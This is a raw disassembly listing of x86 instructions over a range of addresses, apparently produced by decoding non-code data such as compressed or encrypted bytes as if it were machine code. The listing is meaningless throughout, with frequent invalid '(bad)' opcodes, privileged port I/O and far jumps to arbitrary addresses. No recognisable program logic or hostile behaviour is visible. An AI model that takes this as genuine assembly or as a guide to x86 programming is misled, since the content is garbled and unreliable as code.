  414e0d:	mov    ds:0x87b3dbd5,al
  414e12:	mov    ds:0x35433c7d,al
  414e17:	icebp  
  414e18:	out    0x81,eax
  414e1a:	les    ecx,FWORD PTR [edx]
  414e1c:	or     ecx,DWORD PTR [edx-0x2b]
  414e1f:	add    DWORD PTR [eax],0x44b0a538
  414e25:	xor    eax,0x898a4548
  414e2a:	mov    ecx,0x1e68731e
  414e2f:	leave  
  414e30:	and    BYTE PTR [ecx+0x5f9d8282],0xb3
  414e37:	(bad)  
  414e38:	clc    
  414e39:	lods   al,BYTE PTR ds:[esi]
  414e3a:	imul   ebp,eax,0xffffff9b
  414e3d:	lds    edx,FWORD PTR [ebp-0xd]
  414e40:	sub    eax,0x1bd7e4f7
  414e45:	aaa    
  414e46:	(bad)  
  414e47:	fadd   DWORD PTR [edi+0x27268a70]
  414e4d:	inc    esi
  414e4e:	add    al,0xde
  414e50:	or     eax,0x3d9e7fde
  414e55:	push   eax
  414e56:	jae    0x414ea3
  414e58:	jmp    0x414e93
  414e5a:	inc    edx
  414e5b:	sbb    esi,ecx
  414e5d:	cmp    ecx,DWORD PTR [esi]
  414e5f:	enter  0x8431,0x38
  414e63:	fcomp  st(6)
  414e65:	pop    ebp
  414e66:	out    dx,al
  414e67:	fbld   TBYTE PTR [edx]
  414e69:	push   ss
  414e6a:	(bad)  
  414e6b:	in     eax,dx
  414e6c:	scas   al,BYTE PTR es:[edi]
  414e6d:	out    dx,al
  414e6e:	inc    ecx
  414e6f:	xor    eax,0x6fa398a8
  414e74:	mov    esp,0xab6afaac
  414e79:	push   ebp
  414e7a:	pop    edi
  414e7b:	sbb    DWORD PTR [esi],0xb6b37f63
  414e81:	and    BYTE PTR [ecx],al
  414e83:	mov    DWORD PTR [ebp+0x61],esi
  414e86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e87:	aaa    
  414e88:	xchg   esi,eax
  414e89:	sar    DWORD PTR [ebx],1
  414e8b:	loopne 0x414e10
  414e8d:	test   BYTE PTR [ebp-0x7],al
  414e90:	xchg   BYTE PTR [ebp+0x5c08fc3c],dh
  414e96:	jmp    0xb5342951
  414e9b:	xchg   al,ah
  414e9d:	inc    edi
  414e9e:	pop    ds
  414e9f:	stos   BYTE PTR es:[edi],al
  414ea0:	imul   ebx,DWORD PTR [ecx+0x2f],0x68
  414ea4:	add    al,0x25
  414ea6:	shr    DWORD PTR [edi-0x19188411],cl
  414eac:	loopne 0x414f1a
  414eae:	mov    gs,edi
  414eb0:	aaa    
  414eb1:	shl    DWORD PTR [edx+0x329ca894],1
  414eb7:	jbe    0x414f2b
  414eb9:	mov    esi,0x931441a9
  414ebe:	loop   0x414ebd
  414ec0:	inc    ecx
  414ec1:	ja     0x414ee0
  414ec3:	jns    0x414eac
  414ec5:	push   esp
  414ec6:	xor    ebp,DWORD PTR [ebx+0x6a]
  414ec9:	pop    ebx
  414eca:	lock ins BYTE PTR es:[edi],dx
  414ecc:	push   edx
  414ecd:	rcl    DWORD PTR [edx+0x596934c0],cl
  414ed3:	or     eax,0x9ad6409a
  414ed8:	push   esp
  414ed9:	pop    edx
  414eda:	jmp    0x414ebe
  414edc:	pop    esi
  414edd:	icebp  
  414ede:	mov    dh,BYTE PTR [ebp-0x52bccd0f]
  414ee4:	xchg   ebp,eax
  414ee5:	add    DWORD PTR [edx+0x3243ec6f],edx
  414eeb:	inc    eax
  414eec:	cmc    
  414eed:	jne    0x414f0a
  414eef:	sbb    esp,DWORD PTR [eax+0x6e]
  414ef2:	xor    edx,ebx
  414ef4:	cmc    
  414ef5:	inc    ebx
  414ef6:	jb     0x414e85
  414ef8:	and    ebp,DWORD PTR [edx]
  414efa:	std    
  414efb:	or     BYTE PTR [bp+si+0x43],0xd9
  414f00:	cmp    edi,DWORD PTR [esi-0x23]
  414f03:	jge    0x414e8f
  414f05:	mov    esi,0x2a71d74a
  414f0a:	icebp  
  414f0b:	fisub  WORD PTR [eax]
  414f0d:	(bad)  
  414f0e:	jmp    0x41da1c
	...
  414f73:	add    BYTE PTR [edi],dh
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd13:0x59bdaf97
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    eax,0xe6000001
  414f8d:	sbb    bh,BYTE PTR [ebp+ebp*4-0x7fd05c95]
  414f94:	daa    
  414f95:	clc    
  414f96:	enter  0xa54,0xb
  414f9a:	(bad)  
  414f9b:	jle    0x414f58
  414f9d:	push   0x54d05ed3
  414fa2:	xor    eax,DWORD PTR [edx]
  414fa4:	xor    BYTE PTR [ebx],ah
  414fa6:	dec    edx
  414fa7:	dec    edx
  414fa8:	push   ecx
  414fa9:	xor    ebp,DWORD PTR [ebp-0x1c]
  414fac:	(bad)  
  414fad:	add    ch,0x19
  414fb0:	int3   
  414fb1:	pop    eax
  414fb2:	inc    edx
  414fb3:	out    dx,al
  414fb4:	lods   eax,DWORD PTR ds:[esi]
  414fb5:	pop    ebp
  414fb6:	xchg   BYTE PTR ss:[ebx-0x80],bl
  414fba:	sub    al,0x7
  414fbc:	push   cs
  414fbd:	repnz and eax,DWORD PTR [eax-0x7965bb43]
  414fc4:	sbb    cl,BYTE PTR [esi-0x7d]
  414fc7:	xchg   ecx,eax
  414fc8:	aam    0x44
  414fca:	or     eax,0x1082d375
  414fcf:	inc    ebx
  414fd0:	pop    eax
  414fd1:	lea    edi,[esi+0x17633f01]
  414fd7:	(bad)  
  414fd8:	fsubr  DWORD PTR [edi+eiz*4]
  414fdb:	stos   DWORD PTR es:[edi],eax
  414fdc:	aaa    
  414fdd:	xor    al,0x37
  414fdf:	gs jae 0x414fc0
  414fe2:	adc    esp,DWORD PTR [edx-0x69]
  414fe5:	adc    eax,0x9c5955f8
  414fea:	pop    edi
  414feb:	fstp   QWORD PTR [edi-0x6b19f12a]
  414ff1:	jge    0x415007
  414ff3:	xor    eax,0x49834b6a
  414ff8:	jp     0x41503a
  414ffa:	aaa    
  414ffb:	pop    esi
  414ffc:	shr    DWORD PTR [ecx-0x6c6bfb08],0x71
  415003:	cli    
  415004:	mov    ecx,0x6a43874f
  415009:	pushf  
  41500a:	inc    esi
  41500b:	cmp    DWORD PTR [edx+0x42f4d607],edx
  415011:	cmp    ecx,edi
  415013:	popf   
  415014:	std    
  415015:	push   ecx
  415016:	or     eax,0x46d0d7f4
  41501b:	repz aas 
  41501d:	aas    
  41501e:	inc    eax
  41501f:	mov    edi,edx
  415021:	pop    edx
  415022:	add    al,0x74
  415024:	aad    0x57
  415026:	mov    cl,0xd7
  415028:	in     al,dx
  415029:	sbb    esi,DWORD PTR [esi+0x43]
  41502c:	cs push cs
  41502e:	mov    cl,0x73
  415030:	in     al,dx
  415031:	es mov cl,0x3e
  415034:	sbb    al,0xc
  415036:	dec    edi
  415037:	mov    bh,0x11
  415039:	push   ebx
  41503a:	pop    ecx
  41503b:	lods   al,BYTE PTR ds:[esi]
  41503c:	shr    BYTE PTR [edx+0x15],0x27
  415040:	mov    BYTE PTR [edx-0x7c],dh
  415043:	mov    al,0xec
  415045:	mov    ah,0x2e
  415047:	mov    bh,0x5a
  415049:	sub    al,0xa0
  41504b:	pop    es
  41504c:	xor    ah,BYTE PTR [edx-0x1ddf4527]
  415052:	(bad)  
  415053:	mov    WORD PTR [ebx-0x68],es
  415056:	daa    
  415057:	mov    DWORD PTR [ebp+0x44],0x46e906c8
  41505e:	stos   DWORD PTR es:[edi],eax
  41505f:	test   al,0x6a
  415061:	push   eax
  415062:	adc    BYTE PTR [eax],ah
  415064:	push   ss
  415065:	dec    ecx
  415066:	mov    ds:0x8e8cb2e3,eax
  41506b:	pop    esp
  41506c:	das    
  41506d:	int    0xe0
  41506f:	jnp    0x414ff6
  415071:	xor    DWORD PTR ds:0xed2c3290,esi
  415077:	dec    ebx
  415078:	and    BYTE PTR ds:0x14b983eb,bh
  41507e:	xor    al,0xa5
  415080:	test   al,0x23
  415082:	push   0xb285d313
  415087:	push   esi
  415088:	jo     0x4150c8
  41508a:	aad    0x2c
  41508c:	lods   al,BYTE PTR ds:[esi]
  41508d:	lods   eax,DWORD PTR ds:[esi]
  41508e:	in     al,dx
  41508f:	dec    edi
  415090:	test   BYTE PTR [eax],0x0
	...
  4150f3:	add    BYTE PTR [ebx+0x2],bh
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0xbb5cfc2d
  415102:	ja     0x415146
  415104:	sbb    dh,bl
  415106:	add    BYTE PTR [eax],al
  415108:	add    eax,0x15000001
  41510d:	xor    DWORD PTR [ebp+0x2b29ae28],edi
  415113:	scas   eax,DWORD PTR es:[edi]
  415114:	ret    0x4913
  415117:	or     cl,cl
  415119:	mov    ecx,0x2017d6a5
  41511e:	mov    al,0xdc
  415120:	in     eax,0x19
  415122:	xchg   ebx,eax
  415123:	int3   
  415124:	mov    al,0x41
  415126:	rcr    BYTE PTR [eax],1
  415128:	push   cs
  415129:	out    0x97,al
  41512b:	pop    ds
  41512c:	pop    ss
  41512d:	sti    
  41512e:	cs inc esi
  415130:	push   esi
  415131:	and    eax,0xef1c6246
  415136:	(bad)  
  415137:	fsub   st,st(2)
  415139:	loope  0x4150d3
  41513b:	lock ret 0x5388
  41513f:	cmp    bh,BYTE PTR [eax]
  415141:	ins    DWORD PTR es:[edi],dx
  415142:	std    
  415143:	mov    al,ds:0x16a9a9a2
  415148:	mov    bh,0xa6
  41514a:	out    0xe5,eax
  41514c:	inc    esi
  41514d:	dec    edx
  41514e:	and    ebx,DWORD PTR [edx]
  415150:	cmp    BYTE PTR [bx+si+0x51ae],0x18
  415156:	push   0xfb486861
  41515b:	clc    
  41515c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41515d:	mov    WORD PTR [ebp+eiz*1-0x30],gs
  415161:	sbb    DWORD PTR [esi],esi
  415163:	jae    0x4151d1
  415165:	or     cl,BYTE PTR [ebx+0x2941184]
  41516b:	(bad)  
  41516c:	jmp    0xfe018377
  415171:	sub    edx,DWORD PTR [ecx-0x43]
  415174:	adc    al,0xdb
  415176:	popa   
  415177:	fwait
  415178:	xor    eax,0xa747cad5
  41517d:	add    ch,BYTE PTR [ecx]
  41517f:	mov    ch,0xd2
  415181:	je     0x41511f
  415183:	in     al,dx
  415184:	jg     0x41510c
  415186:	(bad)  
  415187:	jo     0x415155
  415189:	mov    dh,0x90
  41518b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41518c:	cmp    DWORD PTR [ebp-0x8fccaab],eax
  415192:	cld    
  415193:	ja     0x41517d
  415195:	fisub  WORD PTR gs:[ebp-0x2ce358da]
  41519c:	arpl   WORD PTR [edx-0x2f47aa0e],ax
  4151a2:	jmp    0x41512e
  4151a4:	dec    esp
  4151a5:	jno    0x41518b
  4151a7:	daa    
  4151a8:	dec    ebx
  4151a9:	push   cs
  4151aa:	imul   ecx,edx,0xdd4b9c9f
  4151b0:	fst    DWORD PTR [eax+0x612b9a25]
  4151b6:	jecxz  0x415155
  4151b8:	aad    0xe6
  4151ba:	call   0x63e9544a
  4151bf:	test   BYTE PTR [edi+0x2d],ah
  4151c2:	and    eax,0xc95716bd
  4151c7:	mov    bh,0x25
  4151c9:	call   0xb80e5acb
  4151ce:	bound  esp,QWORD PTR [edi-0x61]
  4151d1:	sub    DWORD PTR [esi],edx
  4151d3:	and    DWORD PTR [edx-0x72],edi
  4151d6:	xchg   edx,eax
  4151d7:	sbb    bl,cl
  4151d9:	jp     0x415232
  4151db:	dec    edi
  4151dc:	cld    
  4151dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151de:	fisttp QWORD PTR [ebx+edi*2]
  4151e1:	jns    0x415249
  4151e3:	ss cs shl ah,0x8d
  4151e8:	jbe    0x415238
  4151ea:	sbb    BYTE PTR [edi+0xc4d13fe],ch
  4151f0:	inc    ecx
  4151f1:	rcl    eax,0x59
  4151f4:	xchg   esp,eax
  4151f5:	(bad)  
  4151f7:	cmp    BYTE PTR [ecx],0x2a
  4151fa:	jp     0x41525a
  4151fc:	push   ebx
  4151fd:	or     bh,al
  4151ff:	icebp  
  415200:	ins    BYTE PTR es:[edi],dx
  415201:	pop    ebx
  415202:	mov    eax,0x4fa9ea93
  415207:	jnp    0x4151ef
  415209:	mov    BYTE PTR [edx+0x3e],al
  41520c:	test   cl,ch
  41520e:	xchg   al,ch
  415210:	test   BYTE PTR [eax],0x0
	...
  415273:	add    BYTE PTR [edi+edx*4],ch
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0x9152d00b
  415283:	and    eax,0xdf1d
  415288:	add    eax,0x3a000001
  41528d:	mov    cl,0xfa
  41528f:	adc    BYTE PTR [esi],bh
  415291:	ret    0x1b3
  415294:	pop    ebx
  415295:	mov    ds:0xd7f9fe42,al
  41529a:	mov    ds:0x53cf1317,al
  41529f:	(bad)  
  4152a0:	cmp    ebx,DWORD PTR [ecx]
  4152a2:	jmp    eax
  4152a4:	inc    esi
  4152a5:	push   ecx
  4152a6:	mov    cl,0x53
  4152a8:	mov    dh,dh
  4152aa:	clc    
  4152ab:	mov    cl,0x72
  4152ad:	mov    ebx,0x7ba29a03
  4152b2:	pop    ecx
  4152b3:	in     al,dx
  4152b4:	jno    0x4152f6
  4152b6:	fsub   DWORD PTR [eax]
  4152b8:	mov    eax,ds
  4152ba:	jae    0x41528c
  4152bc:	sub    eax,0xb6a5120a
  4152c1:	jp     0x415321
  4152c3:	(bad)  
  4152c4:	mov    bh,0x76
  4152c6:	in     al,dx
  4152c7:	pop    ebx
  4152c8:	dec    ebx
  4152c9:	les    ebx,FWORD PTR [edx+ebp*4+0x1f954ce1]
  4152d0:	pop    edx
  4152d1:	mov    edx,0x901a668
  4152d6:	and    BYTE PTR [esi+0x5a],al
  4152d9:	ror    DWORD PTR [edx+0x33fa8320],1
  4152df:	sbb    dh,BYTE PTR [ecx+0x5c235d15]
  4152e5:	mov    ecx,0xcb1ba64b
  4152ea:	std    
  4152eb:	adc    edi,DWORD PTR [edi+0x4c73f8c8]
  4152f1:	mov    ebx,DWORD PTR [edx]
  4152f3:	aaa    
  4152f4:	iret   
  4152f5:	cmp    edx,DWORD PTR [edx]
  4152f7:	mov    ds:0x7daec920,eax
  4152fc:	push   esp
  4152fd:	adc    DWORD PTR [ebp-0xfbb2e13],0xffffffad
  415304:	daa    
  415305:	retf   0x4bc5
  415308:	aam    0x41
  41530a:	inc    esp
  41530b:	inc    ebx
  41530c:	call   0x4c39:0x5efa71e2
  415313:	add    bh,ch
  415315:	iret   
  415316:	jb     0x4152b0
  415318:	xor    eax,0xa3e8e226
  41531d:	ds xor eax,0xbf8ad655
  415323:	push   ebx
  415324:	jge    0x415367
  415326:	and    DWORD PTR [edi+0x4fecb0c8],esi
  41532c:	and    edx,DWORD PTR [ebx]
  41532e:	xchg   esp,edi
  415330:	mov    ch,BYTE PTR [edx-0x10]
  415333:	pop    ebx
  415334:	aad    0x3a
  415336:	dec    esp
  415337:	stos   DWORD PTR es:[edi],eax
  415338:	xchg   esp,eax
  415339:	dec    esi
  41533a:	fmul   DWORD PTR [ecx-0x32bdfb0b]
  415340:	jnp    0x41538c
  415342:	jl     0x4153bc
  415344:	aam    0xe2
  415346:	mov    ebx,0x76b49c9c
  41534b:	add    bh,BYTE PTR [edi]
  41534d:	(bad)  [eax-0x1f]
  415350:	(bad)  
  415351:	ins    BYTE PTR es:[edi],dx
  415352:	push   ss
  415353:	cmp    al,BYTE PTR [ecx]
  415355:	jmp    0x41539a
  415357:	ja     0x41532f
  415359:	cmp    al,0x1c
  41535b:	cmp    BYTE PTR [ebx],0xc5
  41535e:	int    0x9d
  415360:	inc    edx
  415361:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415362:	in     al,dx
  415363:	dec    edx
  415364:	mov    bh,0xcf
  415366:	arpl   WORD PTR [esi-0x1b5b6ffa],di
  41536c:	sbb    eax,0xf0878bfb
  415371:	adc    BYTE PTR [ebp+0x5b832e7],dl
  415377:	gs sub al,0x37
  41537a:	pop    ds
  41537b:	inc    eax
  41537c:	jne    0x4152ff
  41537e:	push   cs
  41537f:	mov    cl,BYTE PTR [eax-0x5852bc56]
  415385:	or     al,0x45
  415387:	stos   BYTE PTR es:[edi],al
  415388:	jmp    0x4153c3
  41538a:	sti    
  41538b:	and    esi,ecx
  41538d:	push   cs
  41538e:	sbb    ah,BYTE PTR [ecx+0x64]
	...
  4153f4:	ins    DWORD PTR es:[edi],dx
  4153f5:	lock repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0x41d3e5b0
  415401:	aaa    
  415402:	cdq    
  415403:	or     eax,0xe022
  415408:	add    eax,0x90000001
  41540d:	jl     0x4153a5
  41540f:	das    
  415410:	nop
  415411:	jno    0x4153b0
  415413:	jge    0x4153a4
  415415:	scas   al,BYTE PTR es:[edi]
  415416:	lahf   
  415417:	jecxz  0x4153f2
  415419:	and    DWORD PTR [esi],eax
  41541b:	lahf   
  41541c:	inc    ecx
  41541d:	aaa    
  41541e:	test   DWORD PTR ds:0x8260116,edx
  415424:	sub    cl,dl
  415426:	leave  
  415427:	std    
  415428:	int    0x9
  41542a:	test   al,0xb4
  41542c:	sti    
  41542d:	jmp    0x4154ad
  41542f:	or     eax,0xeb7965d6
  415434:	dec    DWORD PTR [ebx+ebx*2+0x1df19795]
  41543b:	cs dec edi
  41543d:	mov    WORD PTR [esi],?
  41543f:	(bad)  
  415440:	repz push es
  415442:	adc    bh,BYTE PTR [edi+ecx*1+0x16bf4cbe]
  415449:	in     al,dx
  41544a:	sub    ebx,DWORD PTR [eax-0x54]
  41544d:	pop    ebp
  41544e:	cmp    al,0xec
  415450:	dec    eax
  415451:	lds    ebp,FWORD PTR [esp+esi*8]
  415454:	mov    eax,0x27e597a5
  415459:	ficomp WORD PTR [ecx+0x7c4ba2a3]
  41545f:	int3   
  415460:	mov    edx,0x2bae3fe9
  415465:	mov    edx,edx
  415467:	or     BYTE PTR [eax+0x47b3c8e4],ah
  41546d:	sub    ebp,DWORD PTR [ecx+0x6c]
  415470:	cmp    DWORD PTR [edx-0x1f4e734d],ecx
  415476:	jmp    0x415446
  415478:	clc    
  415479:	aam    0xa2
  41547b:	dec    esi
  41547c:	outs   dx,BYTE PTR ds:[esi]
  41547d:	mov    bl,0xda
  41547f:	mul    DWORD PTR [si-0x2fa2]
  415484:	aas    
  415485:	ins    BYTE PTR es:[edi],dx
  415486:	fwait
  415487:	push   ebp
  415488:	and    edi,DWORD PTR [ecx]
  41548a:	in     eax,0x4a
  41548c:	stos   BYTE PTR es:[edi],al
  41548d:	inc    ebx
  41548e:	mov    al,ds:0x333acfca
  415493:	stos   DWORD PTR es:[edi],eax
  415494:	(bad)  
  415495:	clc    
  415496:	imul   ebp,DWORD PTR [eax+esi*1-0x5d],0xffffffea
  41549b:	sbb    al,0x40
  41549d:	mov    BYTE PTR [edx+0x63b5522d],0xec
  4154a4:	call   0xa869:0x16f6382e
  4154ab:	dec    ecx
  4154ac:	push   ds
  4154ad:	or     eax,0x6d47a653
  4154b2:	sbb    BYTE PTR [edx],0x80
  4154b5:	xchg   DWORD PTR [edi+0x198bc4b6],esi
  4154bb:	add    edx,edx
  4154bd:	inc    edi
  4154be:	pop    ss
  4154bf:	jae    0x4154eb
  4154c1:	loop   0x4154f7
  4154c3:	stos   DWORD PTR es:[edi],eax
  4154c4:	jne    0x415451
  4154c6:	test   al,0xdc
  4154c8:	jmp    0x5a5:0x85e6c9d8
  4154cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154d0:	iret   
  4154d1:	jnp    0x415494
  4154d3:	fcom   DWORD PTR [ebp-0x5]
  4154d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154d7:	jne    0x41554f
  4154d9:	jl     0x415554
  4154db:	sub    DWORD PTR [esi+ecx*4+0x4e],ecx
  4154df:	jo     0x4154e1
  4154e1:	cmc    
  4154e2:	mov    edx,0x2dfef6d4
  4154e7:	mov    es,ebx
  4154e9:	adc    bh,BYTE PTR [edx+0xdaa34e3]
  4154ef:	iret   
  4154f0:	xchg   esp,eax
  4154f1:	xlat   BYTE PTR ds:[ebx]
  4154f2:	and    ebp,DWORD PTR [esi]
  4154f4:	mov    cs,WORD PTR [esp+esi*2]
  4154f7:	loopne 0x4154e5
  4154f9:	add    ah,BYTE PTR [eax]
  4154fb:	push   es
  4154fc:	mov    ds:0x3c899916,al
  415501:	fimul  WORD PTR [eax-0x5732c4b5]
  415507:	xchg   esi,eax
  415508:	sub    al,0xd7
  41550a:	neg    BYTE PTR [ebp-0x22]
  41550d:	popa   
  41550e:	lods   eax,DWORD PTR ds:[esi]
  41550f:	pop    ebx
  415510:	jb     0x415512
	...
  415572:	add    BYTE PTR [eax],al
  415574:	in     al,0xf0
  415576:	sub    DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x4155e6
  415581:	mov    ebx,0xe127cafb
  415586:	add    BYTE PTR [eax],al
  415588:	add    eax,0x5c000001
  41558d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41558e:	xchg   BYTE PTR [edi-0x44],bl
  415591:	outs   dx,DWORD PTR ds:[esi]
  415592:	aad    0x83
  415594:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415595:	sub    ch,al
  415597:	dec    ebx
  415598:	pop    esi
  415599:	mov    cl,0xf9
  41559b:	push   ss
  41559c:	push   cs
  41559d:	mov    dh,0xc6
  41559f:	pop    edi
  4155a0:	stc    
  4155a1:	lds    edx,FWORD PTR [edx+0x45]
  4155a4:	mov    cl,0x94
  4155a6:	mov    ah,0x63
  4155a8:	xchg   edi,eax
  4155a9:	retf   
  4155aa:	std    
  4155ab:	mov    ds:0xe427aee8,eax
  4155b0:	bound  ebx,QWORD PTR [esi*2+0x1f2e289e]
  4155b7:	sub    DWORD PTR [ebp+0x576f67bc],ebp
  4155bd:	test   eax,0x4d594e41
  4155c2:	sub    BYTE PTR [esi+0xd4d3bf0],bh
  4155c8:	arpl   WORD PTR [ebx-0x79],sp
  4155cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155cc:	mov    esi,ss
  4155ce:	jne    0x4155f7
  4155d0:	adc    bh,BYTE PTR [esp+ecx*1-0x4a6ab024]
  4155d7:	out    dx,al
  4155d8:	push   esi
  4155d9:	(bad)
  4155de:	mov    dl,0x51
  4155e0:	ret    0xbea4
  4155e3:	lock pop esp
  4155e5:	cdq    
  4155e6:	std    
  4155e7:	inc    eax
  4155e8:	pop    DWORD PTR [eax]
  4155ea:	dec    esp
  4155eb:	not    DWORD PTR [ebx-0x427068ec]
  4155f1:	fcomp  DWORD PTR [edi+ebx*8-0x71]
  4155f5:	fadd   st,st(5)
  4155f7:	in     al,dx
  4155f8:	fistp  QWORD PTR [ecx]
  4155fa:	pop    edx
  4155fb:	dec    esp
  4155fc:	repz inc ecx
  4155fe:	arpl   dx,di
  415600:	mov    ebp,0xba78f8fc
  415605:	retf   
  415606:	pop    eax
  415607:	and    ebp,DWORD PTR cs:[ecx+eiz*4-0x2cbd0740]
  41560f:	inc    eax
  415610:	xchg   ebp,eax
  415611:	(bad)  
  415612:	lds    ebp,FWORD PTR [ebp+edi*8-0x35]
  415616:	inc    ecx
  415617:	push   cs
  415618:	inc    ecx
  415619:	xchg   esp,eax
  41561a:	adc    cl,BYTE PTR [esi]
  41561c:	xor    dh,BYTE PTR [ebx+0x6b]
  41561f:	pop    ss
  415620:	adc    ebx,DWORD PTR [edx]
  415622:	xchg   edx,eax
  415623:	cmp    DWORD PTR [ebp+0x28],edx
  415626:	daa    
  415627:	ficom  DWORD PTR [edi]
  415629:	(bad)  
  41562a:	sbb    DWORD PTR [esi-0x10],esi
  41562d:	fstp   TBYTE PTR [esi+0x5b]
  415630:	adc    BYTE PTR [edx],al
  415632:	or     ch,BYTE PTR [eax+0x2bee40b8]
  415638:	das    
  415639:	mov    dl,0xbe
  41563b:	ror    DWORD PTR ds:0x20ac5f64,1
  415641:	push   cs
  415642:	sub    bh,0x56
  415645:	jl     0x415639
  415647:	les    esp,FWORD PTR [eax]
  415649:	push   es
  41564a:	fwait
  41564b:	dec    edi
  41564c:	dec    edx
  41564d:	pop    ecx
  41564e:	mov    ebx,0x478c0b2b
  415653:	sub    eax,0x1f1d8fe0
  415658:	aad    0x57
  41565a:	(bad)  
  41565b:	(bad)  
  41565c:	mov    ch,0x96
  41565e:	xor    BYTE PTR [ebx+esi*2+0x67a8a1f0],dh
  415665:	sub    eax,eax
  415667:	xor    ebx,ecx
  415669:	arpl   WORD PTR [ebp+ebx*8-0x75691933],cx
  415670:	inc    edx
  415671:	or     ch,BYTE PTR [esi+0x18]
  415674:	and    edx,edi
  415676:	push   esp
  415677:	or     dl,0xc2
  41567a:	jae    0x415672
  41567c:	test   esp,ebp
  41567e:	push   edi
  41567f:	add    BYTE PTR [edi+0x67a2b47d],cl
  415685:	or     esi,eax
  415687:	fcmovnu st,st(6)
  415689:	pop    esi
  41568a:	sub    ebx,DWORD PTR [esi-0x38706455]
  415690:	lea    eax,[eax]
	...
  4156f2:	add    BYTE PTR [eax],al
  4156f4:	ins    DWORD PTR es:[edi],dx
  4156f5:	call   0xbafd:0x67ff45bc
  4156fc:	mov    bl,0xba
  4156fe:	inc    esi
  4156ff:	sub    al,0x4b
  415701:	sbb    DWORD PTR [ebp+0x6a],edx
  415704:	sub    al,0xe2
  415706:	add    BYTE PTR [eax],al
  415708:	add    eax,0x13000001
  41570d:	sahf   
  41570e:	fldcw  WORD PTR [ebx-0x63]
  415711:	cmp    ebx,esi
  415713:	mov    ds:0x64eb9e27,eax
  415718:	sbb    BYTE PTR ds:0xec5f5e37,ch
  41571e:	scas   eax,DWORD PTR es:[edi]
  41571f:	inc    ebp
  415720:	jp     0x41578a
  415722:	mov    dh,0x2f
  415724:	addr16 in al,dx
  415726:	retf   
  415727:	xchg   esi,eax
  415728:	jl     0x415752
  41572a:	push   edx
  41572b:	inc    edx
  41572c:	rcr    dh,1
  41572e:	pusha  
  41572f:	inc    ebx
  415730:	je     0x41577b
  415732:	fcomp  QWORD PTR [edx-0xd]
  415735:	pop    ds
  415736:	mov    BYTE PTR [esi],dh
  415738:	lea    edi,[eax]
  41573a:	loope  0x4157a4
  41573c:	mov    bh,0xf7
  41573e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41573f:	push   ecx
  415740:	pcmpgtd mm0,QWORD PTR ds:0xb6649ffd
  415747:	xlat   BYTE PTR ds:[ebx]
  415748:	xor    al,0xbd
  41574a:	mov    dh,0xcd
  41574c:	ds mov edi,0xb94f3445
  415752:	jo     0x415723
  415754:	sub    eax,0xb37a49f5
  415759:	std    
  41575a:	jl     0x4157bf
  41575c:	inc    edi
  41575d:	xlat   BYTE PTR ds:[ebx]
  41575e:	pop    esp
  41575f:	push   edi
  415760:	inc    esi
  415761:	jae    0x415765
  415763:	inc    ebp
  415765:	repnz or eax,DWORD PTR [ebx+ecx*1+0x7fcbeadb]
  41576d:	lea    eax,[edx]
  41576f:	xchg   ebp,eax
  415770:	imul   ebx,ecx,0x9762518a
  415776:	addr16 popa 
  415778:	cmp    al,0x8c
  41577a:	sahf   
  41577b:	je     0x4157f1
  41577d:	pop    esp
  41577e:	out    dx,eax
  41577f:	sbb    al,0x95
  415781:	std    
  415782:	sbb    al,0x8
  415784:	sahf   
  415785:	sbb    al,0x1
  415787:	test   BYTE PTR [ebp-0x28],al
  41578a:	test   eax,0x65a61156
  41578f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415790:	push   eax
  415791:	or     dl,BYTE PTR [edi]
  415793:	jg     0x415728
  415795:	jle    0x415730
  415797:	xor    esi,ebp
  415799:	sub    BYTE PTR [edi+0x6b],al
  41579c:	arpl   WORD PTR gs:[ebp+ebx*8-0x17],bp
  4157a1:	dec    ebp
  4157a2:	mov    ah,0xd0
  4157a4:	pop    ss
  4157a5:	sbb    al,0x2d
  4157a7:	add    ebx,0x1ea8ed1a
  4157ad:	fstp   QWORD PTR [ebp-0x72882886]
  4157b3:	or     ah,BYTE PTR [eax+eax*1+0x35a9d1ba]
  4157ba:	sti    
  4157bb:	fdivr  QWORD PTR [eax+0x1d98bee0]
  4157c1:	mov    ch,0x50
  4157c3:	xchg   BYTE PTR [edx],ch
  4157c5:	mov    bh,0x4a
  4157c7:	xchg   ebx,eax
  4157c8:	push   ecx
  4157c9:	add    bl,BYTE PTR [edi-0x2a]
  4157cc:	jmp    0xd6fc:0xfffbc2db
  4157d3:	(bad)  
  4157d4:	push   esp
  4157d5:	mov    cl,0x8
  4157d7:	push   ebp
  4157d8:	ror    BYTE PTR [edx],1
  4157da:	mov    dh,0x73
  4157dc:	pusha  
  4157dd:	je     0x4157e4
  4157df:	fsubr  st,st(4)
  4157e1:	fdivr  st,st(0)
  4157e3:	xor    DWORD PTR [eax+0x10cfdefe],edi
  4157e9:	pop    esi
  4157ea:	sbb    eax,0xbb214dfa
  4157ef:	enter  0x3dca,0xba
  4157f3:	sub    ecx,0xe8c437f6
  4157f9:	push   0xb9542285
  4157fe:	jae    0x415805
  415800:	push   eax
  415801:	and    DWORD PTR [eax-0x2b],0xcb3da934
  415808:	or     DWORD PTR [edx],edx
  41580a:	jns    0x415805
  41580c:	push   esi
  41580d:	and    DWORD PTR [edx+0x79],esp
  415810:	data16 add BYTE PTR [eax],al
	...
